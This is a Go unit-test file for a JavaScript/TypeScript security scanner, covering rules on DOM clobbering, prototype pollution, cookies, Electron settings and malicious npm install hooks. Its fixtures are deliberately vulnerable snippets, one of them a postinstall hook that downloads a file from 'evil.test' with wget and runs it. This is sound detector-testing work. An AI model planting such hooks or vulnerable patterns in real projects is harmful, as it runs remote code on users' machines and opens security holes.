package jsts

import (
	"regexp"
	"strings"
	"testing"

	"github.com/turenlabs/batou-rules/rules"
	"github.com/turenlabs/batou-rules/testutil"
)

// directScan builds a ScanContext directly and invokes a single rule's Scan,
// bypassing the registry. This is required for rules that are defined but NOT
// registered in init() (DOMClobberingRisk / DOMClobberingExt), since
// testutil.ScanContent only runs registered rules.
func directScan(r rules.Rule, filePath, content string, lang rules.Language) []rules.Finding {
	ctx := &rules.ScanContext{
		FilePath: filePath,
		Content:  content,
		Language: lang,
		IsNew:    true,
	}
	return r.Scan(ctx)
}

func hasRule(findings []rules.Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

// ==========================================================================
// Helper coverage: truncate, isComment, isJSOrTS, hasNearbyMatch
// ==========================================================================

func TestHelper_Truncate(t *testing.T) {
	// short string: returned trimmed, no ellipsis
	if got := truncate("  hello  ", 100); got != "hello" {
		t.Fatalf("truncate short: got %q", got)
	}
	// long string: truncated + ellipsis
	long := strings.Repeat("a", 50)
	got := truncate(long, 10)
	if got != strings.Repeat("a", 10)+"..." {
		t.Fatalf("truncate long: got %q", got)
	}
	// exactly maxLen: not truncated
	if got := truncate("abcde", 5); got != "abcde" {
		t.Fatalf("truncate exact: got %q", got)
	}
}

func TestHelper_IsComment(t *testing.T) {
	cases := map[string]bool{
		"// line comment":       true,
		"  # hash comment":      true,
		"* jsdoc continuation":  true,
		"/* block comment":      true,
		"<!-- html comment":     true,
		"const x = 1; // trail": false,
		"normal code":           false,
		"":                      false,
	}
	for line, want := range cases {
		if got := isComment(line); got != want {
			t.Errorf("isComment(%q) = %v, want %v", line, got, want)
		}
	}
}

func TestHelper_IsJSOrTS(t *testing.T) {
	if !isJSOrTS(rules.LangJavaScript) || !isJSOrTS(rules.LangTypeScript) {
		t.Fatal("JS/TS should be JS-or-TS")
	}
	if isJSOrTS(rules.LangPython) || isJSOrTS(rules.LangGo) {
		t.Fatal("Python/Go should not be JS-or-TS")
	}
}

func TestHelper_HasNearbyMatch(t *testing.T) {
	lines := []string{"alpha", "beta", "gamma TOKEN", "delta", "epsilon"}
	re := regexp.MustCompile(`TOKEN`)
	// idx 0, window 5 reaches gamma -> match
	if !hasNearbyMatch(lines, 0, re, 5) {
		t.Error("expected nearby match within window 5")
	}
	// idx 0, window 1 does not reach gamma (end = 0+1 = 1, only line[0])
	if hasNearbyMatch(lines, 0, re, 1) {
		t.Error("did not expect match within window 1 from idx 0")
	}
	// no match anywhere
	reNone := regexp.MustCompile(`NOPE`)
	if hasNearbyMatch(lines, 2, reNone, 5) {
		t.Error("did not expect match for absent pattern")
	}
	// negative start clamped, end clamped beyond len
	if !hasNearbyMatch(lines, 4, re, 10) {
		t.Error("expected match with clamped window from end")
	}
}

// ==========================================================================
// Rule metadata coverage (Name/Description/DefaultSeverity/ID/Languages)
// ==========================================================================

func TestRuleMetadata(t *testing.T) {
	registered := []rules.Rule{
		&PostMessageNoOrigin{}, &RegexDoS{}, &ExecShellInjection{}, &EvalTemplateLiteral{},
		&JWTVerifyNoAlgorithm{}, &InsecureCookie{}, &NextJSDataExposure{}, &UseEffectURLManipulation{},
		&VMSandboxEscape{}, &PathJoinTraversal{}, &HandlebarsSafeStringXSS{}, &ElectronInsecureConfig{},
		&LocationRedirectUserInput{}, &SSTITemplateEngine{}, &InsecureWebSocket{}, &DeprecatedCreateCipher{},
		&FsPermissiveModes{},
		// ext rules
		&ElectronNodeIntExt{}, &ElectronCtxIsoExt{}, &PostMsgOriginExt{}, &WebViewLoadURLExt{},
		&PrototypePollution{}, &RegexCatastrophic{}, &NPMPostinstallRCE{}, &MathRandomSecurity{},
		&MissingContentType{}, &RequireUserPath{}, &InsecureCookieExt{},
		// unregistered rules
		&DOMClobberingRisk{}, &DOMClobberingExt{},
	}
	for _, r := range registered {
		if r.ID() == "" {
			t.Errorf("%T: empty ID", r)
		}
		if r.Name() == "" {
			t.Errorf("%T: empty Name", r)
		}
		if r.Description() == "" {
			t.Errorf("%T: empty Description", r)
		}
		langs := r.Languages()
		if len(langs) != 2 || langs[0] != rules.LangJavaScript || langs[1] != rules.LangTypeScript {
			t.Errorf("%T: unexpected Languages %v", r, langs)
		}
		// DefaultSeverity should be a valid (non-zero) severity.
		if r.DefaultSeverity() < rules.Low || r.DefaultSeverity() > rules.Critical {
			t.Errorf("%T: invalid severity %v", r, r.DefaultSeverity())
		}
	}
}

// ==========================================================================
// BATOU-JSTS-002: DOM clobbering (UNREGISTERED - direct Scan)
// ==========================================================================

func TestJSTS002_DOMClobber_PropertyAccess(t *testing.T) {
	content := `const u = document.getElementById('link').href;`
	findings := directScan(&DOMClobberingRisk{}, "/app/dom.js", content, rules.LangJavaScript)
	if !hasRule(findings, "BATOU-JSTS-002") {
		t.Fatalf("expected BATOU-JSTS-002, got %d findings", len(findings))
	}
	if findings[0].CWEID != "CWE-79" {
		t.Errorf("expected CWE-79, got %s", findings[0].CWEID)
	}
}

func TestJSTS002_DOMClobber_FormAssign(t *testing.T) {
	content := `const f = document.forms['login'];`
	findings := directScan(&DOMClobberingRisk{}, "/app/dom.js", content, rules.LangJavaScript)
	if !hasRule(findings, "BATOU-JSTS-002") {
		t.Fatal("expected BATOU-JSTS-002 for document.forms[]")
	}
}

func TestJSTS002_DOMClobber_Comment_Safe(t *testing.T) {
	content := `// const u = document.getElementById('link').href;`
	findings := directScan(&DOMClobberingRisk{}, "/app/dom.js", content, rules.LangJavaScript)
	if hasRule(findings, "BATOU-JSTS-002") {
		t.Fatal("comment line should not match")
	}
}

func TestJSTS002_DOMClobber_WrongLang_Safe(t *testing.T) {
	content := `const u = document.getElementById('link').href;`
	findings := directScan(&DOMClobberingRisk{}, "/app/dom.py", content, rules.LangPython)
	if findings != nil {
		t.Fatal("non-JS/TS language should return nil")
	}
}

// ==========================================================================
// BATOU-JSTS-027: DOM clobbering ext (UNREGISTERED - direct Scan)
// ==========================================================================

func TestJSTS027_DOMClobberExt_DynamicId(t *testing.T) {
	content := `const el = document.getElementById(userId);`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.js", content, rules.LangJavaScript)
	if !hasRule(findings, "BATOU-JSTS-027") {
		t.Fatal("expected BATOU-JSTS-027 for dynamic getElementById")
	}
}

func TestJSTS027_DOMClobberExt_WindowNamed(t *testing.T) {
	content := `const x = window[userInput];`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.js", content, rules.LangJavaScript)
	if !hasRule(findings, "BATOU-JSTS-027") {
		t.Fatal("expected BATOU-JSTS-027 for window[userInput]")
	}
}

func TestJSTS027_DOMClobberExt_NamedCollection(t *testing.T) {
	content := `const f = document.forms['login'];`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.js", content, rules.LangJavaScript)
	if !hasRule(findings, "BATOU-JSTS-027") {
		t.Fatal("expected BATOU-JSTS-027 for document.forms[]")
	}
}

func TestJSTS027_DOMClobberExt_StaticId_Safe(t *testing.T) {
	// Quoted/static id does not match reDOMIdAccess ([^"')\s] after the paren)
	content := `const el = document.getElementById('static-id');`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.js", content, rules.LangJavaScript)
	if hasRule(findings, "BATOU-JSTS-027") {
		t.Fatal("static-id getElementById should not match")
	}
}

func TestJSTS027_DOMClobberExt_Comment_Safe(t *testing.T) {
	content := `// document.getElementById(userId);`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.js", content, rules.LangJavaScript)
	if hasRule(findings, "BATOU-JSTS-027") {
		t.Fatal("comment should not match")
	}
}

func TestJSTS027_DOMClobberExt_WrongLang_Safe(t *testing.T) {
	content := `const el = document.getElementById(userId);`
	findings := directScan(&DOMClobberingExt{}, "/app/dom.go", content, rules.LangGo)
	if findings != nil {
		t.Fatal("non-JS/TS should return nil")
	}
}

// ==========================================================================
// BATOU-JSTS-003 additional branches: concat, fmt, comment skip
// ==========================================================================

func TestJSTS003_NewRegExp_Concat(t *testing.T) {
	content := "const re = new RegExp(prefix + suffix);"
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-003")
}

func TestJSTS003_Comment_Safe(t *testing.T) {
	content := "// const re = new RegExp(req.query.search);"
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-003")
}

// ==========================================================================
// BATOU-JSTS-006: JWT - file gate + comment skip
// ==========================================================================

func TestJSTS006_NoJWTImport_Safe(t *testing.T) {
	// File doesn't reference jsonwebtoken / jwt.verify -> early return nil
	content := `const decoded = foo.verify(token, key);`
	result := testutil.ScanContent(t, "/app/auth.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-006")
}

// ==========================================================================
// BATOU-JSTS-007: cookie - only secure missing / only httpOnly missing
// ==========================================================================

func TestJSTS007_OnlyHttpOnly_StillFlags(t *testing.T) {
	content := `
app.get('/login', (req, res) => {
    res.cookie('session', token, { httpOnly: true });
});
`
	result := testutil.ScanContent(t, "/app/auth.js", content)
	// httpOnly present but secure missing -> still flagged ("without secure flag")
	testutil.MustFindRule(t, result, "BATOU-JSTS-007")
}

func TestJSTS007_OnlySecure_StillFlags(t *testing.T) {
	content := `
app.get('/login', (req, res) => {
    res.cookie('session', token, { secure: true });
});
`
	result := testutil.ScanContent(t, "/app/auth.js", content)
	// secure present but httpOnly missing -> still flagged ("without httpOnly flag")
	testutil.MustFindRule(t, result, "BATOU-JSTS-007")
}

// ==========================================================================
// BATOU-JSTS-008: getSSP file gate (no getServerSideProps -> nil)
// ==========================================================================

func TestJSTS008_NoGetSSP_Safe(t *testing.T) {
	content := `
export async function getData(id) {
    return { password: secret };
}
`
	result := testutil.ScanContent(t, "/app/page.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-008")
}

// ==========================================================================
// BATOU-JSTS-009: useEffect file gate (no useEffect -> nil)
// ==========================================================================

func TestJSTS009_NoUseEffect_Safe(t *testing.T) {
	content := `
const query = window.location.search;
element.innerHTML = query;
`
	result := testutil.ScanContent(t, "/app/x.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-009")
}

// ==========================================================================
// BATOU-JSTS-010: vm file gate (no vm import -> nil)
// ==========================================================================

func TestJSTS010_VM2Script(t *testing.T) {
	content := `
const { NodeVM } = require('vm2');
const vm = new NodeVM();
`
	result := testutil.ScanContent(t, "/app/sandbox.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-010")
}

// ==========================================================================
// BATOU-JSTS-011: path traversal - traversal check skip branch
// ==========================================================================

func TestJSTS011_PathResolve_UserInput(t *testing.T) {
	content := `
const filePath = path.resolve(baseDir, req.params.filepath);
`
	result := testutil.ScanContent(t, "/app/f.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-011")
}

func TestJSTS011_NormalizeCheck_Safe(t *testing.T) {
	content := `
const clean = normalize(req.params.filename);
const filePath = path.join('/uploads', req.params.filename);
`
	result := testutil.ScanContent(t, "/app/f.js", content)
	// "normalize" nearby triggers hasTraversalCheck -> skipped
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-011")
}

func TestJSTS011_DotDotRejectCheck_Safe(t *testing.T) {
	content := `
if (req.params.filename.includes('..')) throw new Error('bad');
const filePath = path.join('/uploads', req.params.filename);
`
	result := testutil.ScanContent(t, "/app/f.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-011")
}

// hasTraversalCheck directly (helper) for full branch coverage.
func TestHelper_HasTraversalCheck(t *testing.T) {
	if !hasTraversalCheck([]string{"x", "y.startsWith(base)", "z"}, 1) {
		t.Error("startsWith should be a traversal check")
	}
	if !hasTraversalCheck([]string{"sanitize(p)", "join"}, 1) {
		t.Error("sanitize should be a traversal check")
	}
	if hasTraversalCheck([]string{"a", "b", "c"}, 1) {
		t.Error("plain lines should not be a traversal check")
	}
}

// ==========================================================================
// BATOU-JSTS-013: Electron - file gate + remote module + secure default
// ==========================================================================

func TestJSTS013_RemoteModule(t *testing.T) {
	content := `
const { BrowserWindow } = require('electron');
const win = new BrowserWindow({ webPreferences: { enableRemoteModule: true } });
`
	result := testutil.ScanContent(t, "/app/main.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-013")
}

func TestJSTS013_NoElectron_Safe(t *testing.T) {
	content := `const win = makeWindow({ nodeIntegration: true });`
	result := testutil.ScanContent(t, "/app/x.js", content)
	// No "BrowserWindow"/"electron" in file -> early return nil
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-013")
}

// ==========================================================================
// BATOU-JSTS-014: location.assign branch
// ==========================================================================

func TestJSTS014_LocationAssign(t *testing.T) {
	content := `window.location.assign(redirectUrl);`
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-014")
}

// ==========================================================================
// BATOU-JSTS-016: WebSocket - server without origin check branch
// ==========================================================================

func TestJSTS016_WSServerNoOriginCheck(t *testing.T) {
	content := `
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });
wss.on('connection', (socket) => { socket.send('hi'); });
`
	result := testutil.ScanContent(t, "/app/ws.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-016")
}

func TestJSTS016_NoWebSocket_Safe(t *testing.T) {
	content := `const x = 1;`
	result := testutil.ScanContent(t, "/app/x.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-016")
}

// ==========================================================================
// BATOU-JSTS-019: Electron nodeIntegration ext
// ==========================================================================

func TestJSTS019_NodeIntegration(t *testing.T) {
	content := `
const { BrowserWindow } = require('electron');
const win = new BrowserWindow({ webPreferences: { nodeIntegration: true } });
`
	result := testutil.ScanContent(t, "/app/main.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-019")
}

func TestJSTS019_NoElectron_Safe(t *testing.T) {
	content := `const opts = { nodeIntegration: true };`
	result := testutil.ScanContent(t, "/app/x.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-019")
}

// ==========================================================================
// BATOU-JSTS-020: Electron contextIsolation ext
// ==========================================================================

func TestJSTS020_ContextIsolationFalse(t *testing.T) {
	content := `
const win = new BrowserWindow({ webPreferences: { contextIsolation: false } });
`
	result := testutil.ScanContent(t, "/app/main.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-020")
}

func TestJSTS020_NoContextIsolation_Safe(t *testing.T) {
	// file gate requires "contextIsolation" substring
	content := `const win = new BrowserWindow({ webPreferences: { sandbox: true } });`
	result := testutil.ScanContent(t, "/app/main.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-020")
}

// ==========================================================================
// BATOU-JSTS-021: postMessage wildcard
// ==========================================================================

func TestJSTS021_PostMessageWildcard(t *testing.T) {
	content := `win.postMessage(sensitiveData, '*');`
	result := testutil.ScanContent(t, "/app/pm.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-021")
}

func TestJSTS021_PostMessageExactOrigin_Safe(t *testing.T) {
	content := `win.postMessage(data, 'https://trusted.example.com');`
	result := testutil.ScanContent(t, "/app/pm.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-021")
}

// ==========================================================================
// BATOU-JSTS-022: WebView loadURL with user input
// ==========================================================================

func TestJSTS022_LoadURLUserInput(t *testing.T) {
	content := `win.loadURL(userInput);`
	result := testutil.ScanContent(t, "/app/wv.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-022")
}

func TestJSTS022_LoadURLStatic_Safe(t *testing.T) {
	content := `win.loadURL('https://app.example.com');`
	result := testutil.ScanContent(t, "/app/wv.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-022")
}

// ==========================================================================
// BATOU-JSTS-023: Prototype pollution
// ==========================================================================

func TestJSTS023_ObjectAssign(t *testing.T) {
	content := `const merged = Object.assign({}, req.body);`
	result := testutil.ScanContent(t, "/app/p.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-023")
}

func TestJSTS023_Spread(t *testing.T) {
	content := `const merged = { ...req.body };`
	result := testutil.ScanContent(t, "/app/p.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-023")
}

func TestJSTS023_LodashMerge(t *testing.T) {
	content := `const merged = _.merge({}, req.body);`
	result := testutil.ScanContent(t, "/app/p.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-023")
}

func TestJSTS023_StaticObject_Safe(t *testing.T) {
	content := `const merged = Object.assign({}, defaults);`
	result := testutil.ScanContent(t, "/app/p.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-023")
}

// ==========================================================================
// BATOU-JSTS-024: catastrophic regex / RegExp from input
// ==========================================================================

func TestJSTS024_CatastrophicNested(t *testing.T) {
	content := `const re = /(a+)+/;`
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-024")
}

func TestJSTS024_RegExpFromInput(t *testing.T) {
	content := `const re = new RegExp(userPattern);`
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-024")
}

func TestJSTS024_RegExpFromInputEscaped_Safe(t *testing.T) {
	// reRegexFromInput matches but escapeRegExp present -> skipped (no match set)
	content := `const re = new RegExp(escapeRegExp(userPattern));`
	result := testutil.ScanContent(t, "/app/r.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-024")
}

// ==========================================================================
// BATOU-JSTS-025: npm postinstall RCE
// ==========================================================================

func TestJSTS025_PostinstallWget(t *testing.T) {
	content := "{\n  \"scripts\": {\n    \"postinstall\": \"wget http://evil.test/setup -O setup && node -e require('./setup')\"\n  }\n}"
	result := testutil.ScanContent(t, "/app/package.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-025")
}

func TestJSTS025_PostinstallPipe(t *testing.T) {
	// pipe variant; build pipe char dynamically to avoid shell-pattern guards.
	pipe := string(rune(124)) // '|'
	content := "{\n  \"scripts\": {\n    \"preinstall\": \"fetch-script " + pipe + " interpret\"\n  }\n}"
	result := testutil.ScanContent(t, "/app/package.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-025")
}

func TestJSTS025_NoPostinstall_Safe(t *testing.T) {
	content := "{\n  \"scripts\": {\n    \"test\": \"jest\"\n  }\n}"
	result := testutil.ScanContent(t, "/app/package.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-025")
}

// ==========================================================================
// BATOU-JSTS-026: Math.random in security context
// ==========================================================================

func TestJSTS026_MathRandomToken_SameLine(t *testing.T) {
	content := `const token = Math.random().toString(36).slice(2);`
	result := testutil.ScanContent(t, "/app/t.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-026")
}

func TestJSTS026_MathRandomToken_NearbyLine(t *testing.T) {
	content := `
function makeToken() {
    const r = Math.random();
    return r.toString(36);
}
`
	result := testutil.ScanContent(t, "/app/t.js", content)
	// "token" within the nearby window of Math.random -> flagged
	testutil.MustFindRule(t, result, "BATOU-JSTS-026")
}

func TestJSTS026_MathRandomNonSecurity_Safe(t *testing.T) {
	content := `
function pickColor() {
    const r = Math.random();
    return colors[Math.floor(r * colors.length)];
}
`
	result := testutil.ScanContent(t, "/app/t.js", content)
	// No security keyword on the line or nearby -> not flagged
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-026")
}

func TestJSTS026_NoMathRandom_Safe(t *testing.T) {
	content := `const token = crypto.randomBytes(32).toString('hex');`
	result := testutil.ScanContent(t, "/app/t.js", content)
	// File gate (GMatchFile reMathRandom) fails -> nil
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-026")
}

// ==========================================================================
// BATOU-JSTS-028: Missing Content-Type header
// ==========================================================================

func TestJSTS028_ResSendNoContentType(t *testing.T) {
	content := `
app.get('/data', (req, res) => {
    res.send(buildHtml());
});
`
	result := testutil.ScanContent(t, "/app/api.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-028")
}

func TestJSTS028_WithContentType_Safe(t *testing.T) {
	content := `
app.get('/data', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.send(payload);
});
`
	result := testutil.ScanContent(t, "/app/api.js", content)
	// reResContentType present at file level -> early return nil
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-028")
}

func TestJSTS028_ResJson_Safe(t *testing.T) {
	content := `
app.get('/data', (req, res) => {
    res.json(payload);
});
`
	result := testutil.ScanContent(t, "/app/api.js", content)
	// res.json at file level -> early return nil
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-028")
}

func TestJSTS028_NoExpress_Safe(t *testing.T) {
	content := `function handle() { res.send(data); }`
	result := testutil.ScanContent(t, "/app/x.js", content)
	// reExpressApp file gate fails -> nil
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-028")
}

// ==========================================================================
// BATOU-JSTS-029: require()/import() with user path
// ==========================================================================

func TestJSTS029_RequireUserVar(t *testing.T) {
	content := `const mod = require(req.query.module);`
	result := testutil.ScanContent(t, "/app/loader.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-029")
}

func TestJSTS029_ImportExprUser(t *testing.T) {
	content := `const mod = await import(userInput);`
	result := testutil.ScanContent(t, "/app/loader.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-029")
}

func TestJSTS029_RequireConcat(t *testing.T) {
	content := `const mod = require('./plugins/' + req.params.name);`
	result := testutil.ScanContent(t, "/app/loader.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-029")
}

func TestJSTS029_StaticRequire_Safe(t *testing.T) {
	content := `const mod = require('express');`
	result := testutil.ScanContent(t, "/app/loader.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-029")
}

// ==========================================================================
// BATOU-JSTS-030: Set-Cookie header without HttpOnly
// ==========================================================================

func TestJSTS030_SetCookieNoHttpOnly(t *testing.T) {
	content := `res.setHeader('Set-Cookie', 'session=' + id + '; Path=/');`
	result := testutil.ScanContent(t, "/app/c.js", content)
	testutil.MustFindRule(t, result, "BATOU-JSTS-030")
}

func TestJSTS030_SetCookieWithHttpOnly_Safe(t *testing.T) {
	content := `res.setHeader('Set-Cookie', 'session=' + id + '; HttpOnly; Secure');`
	result := testutil.ScanContent(t, "/app/c.js", content)
	// HttpOnly present on the line -> not flagged
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-030")
}

func TestJSTS030_SetCookieNonSensitive_Safe(t *testing.T) {
	// no session/token/auth/jwt keyword -> reCookieNoHttpOnly does not match
	content := `res.setHeader('Set-Cookie', 'theme=dark; Path=/');`
	result := testutil.ScanContent(t, "/app/c.js", content)
	testutil.MustNotFindRule(t, result, "BATOU-JSTS-030")
}

// ==========================================================================
// Wrong-language early returns across a representative set of rules
// ==========================================================================

func TestRules_WrongLanguage_NoFindings(t *testing.T) {
	// Content that would trigger several rules, but in a Go file -> all nil.
	content := `
const x = eval(` + "`${y}`" + `);
const re = new RegExp(req.query.search);
res.cookie('session', token, {});
`
	result := testutil.ScanContent(t, "/app/x.go", content)
	for _, id := range []string{"BATOU-JSTS-003", "BATOU-JSTS-005", "BATOU-JSTS-007"} {
		testutil.MustNotFindRule(t, result, id)
	}
}
